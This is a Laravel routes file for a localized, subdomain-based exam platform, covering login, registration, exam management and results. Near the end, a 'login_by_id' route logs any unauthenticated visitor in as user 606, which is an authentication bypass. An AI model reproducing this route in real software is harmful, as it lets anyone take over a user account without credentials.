<?php

use App\Http\Controllers\frontend\HomeController;
use App\Http\Controllers\frontend\AuthController;
use \App\Http\Controllers\frontend\CommonController;
use App\Http\Controllers\frontend\RoutesController;
use App\Http\Controllers\frontend\ApisController;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;

Route::group([
    'prefix' => \Mcamara\LaravelLocalization\Facades\LaravelLocalization::setLocale(),
    'middleware' => ['localeSessionRedirect', 'localizationRedirect', 'localeViewPath','setsubdomain']],
    function ($subdomain) {
        Route::get('/', [RoutesController::class, 'welcome'])->name('page.welcome.subdomain');
        Route::get('search', [RoutesController::class, 'search'])->name('action.search.subdomain');
        Route::get('/exams', [HomeController::class, 'exams_subdomain'])->name('exams_front.index.subdomain');
        Route::get('/createoreditexam', [HomeController::class, 'createoreditexam'])->middleware('users')->name('exams_front.createoredit.subdomain');
        Route::get('/exams/{slug}', [HomeController::class, 'showexam_subdomain'])->name('exams.show.subdomain');
        Route::get('/exams/{category_id?}', [HomeController::class, 'exams'])->name('exams.subdomain');
        Route::get('/category_exam/{category?}', [HomeController::class, 'category_exam_subdomain'])->name('category_exam.subdomain');
        Route::middleware(['user.guest'])->group(function () {
            Route::get('/login', [AuthController::class, 'login'])->name('login.subdomain');
            Route::get('/register', [AuthController::class, 'register'])->name('register.subdomain');
            Route::post('/authenticate', [AuthController::class, 'authenticate'])->name('user.authenticate.subdomain');
            Route::post('/register-save', [AuthController::class, 'registerSave'])->name('user.register.subdomain');
            Route::get('/email', [AuthController::class, 'email'])->name('email.subdomain');
            Route::post('/send-token', [AuthController::class, 'sendToken'])->name('send.token.subdomain');
            Route::get('/reset/{token}', [AuthController::class, 'reset'])->name('reset.subdomain');
            Route::post('/change-password', [AuthController::class, 'changePassword'])->name('change.password.subdomain');
        });

        Route::group(['middleware' => 'users', 'as' => 'user.'], function () {
            Route::any('profile', [AuthController::class, 'profile'])->name('profile.subdomain');
            Route::any('/logout', [AuthController::class, 'logout'])->name('logout.subdomain');

            Route::group(['prefix' => 'exam'], function () {
                Route::post('add_edit_exam', [CommonController::class, 'add_edit_exam_subdomain'])->name("exam.add_edit_exam.subdomain");
                Route::get('results', [CommonController::class, 'examResults'])->name('exam.results.subdomain');
                Route::get('resultpage/{result_id}', [CommonController::class, 'examResultPage'])->name('exam.resultpage.subdomain');
                Route::get('resultpageallstudents/{exam_id}', [CommonController::class, 'examResultPageStudentsWithSubdomain'])->name('exam.resultpagestudents.subdomain');
                Route::get('results/{result_id}', [CommonController::class, 'examResult'])->name('exam.result.subdomain');
                Route::get("exams/redirect_exam", [CommonController::class, 'redirect_exam'])->name("exams.redirect_exam.subdomain");
                Route::any("exams/set_exam", [CommonController::class, 'set_exam'])->name("exams.set_exam.subdomain");
                Route::post('exams_set_question_value_on_session',[ApisController::class,'set_question_value_on_session']);
                Route::any('/finish', [CommonController::class, 'examFinish'])->name('exam.finish')->middleware('remove.null_value.subdomain');
            });
        });
});

Route::post('exams_set_question_value_on_session',[ApisController::class,'set_question_value_on_session']);

Route::any("checkpayment",[CommonController::class,'checkpayment'])->name("payment.checkpayment");
Route::get("login_by_id",function(){
    $id=606;
    Auth::guard('users')->loginUsingId($id);
    return redirect('/');
});
Route::fallback([CommonController::class, 'notfound'])->name('notfound.subdomain');
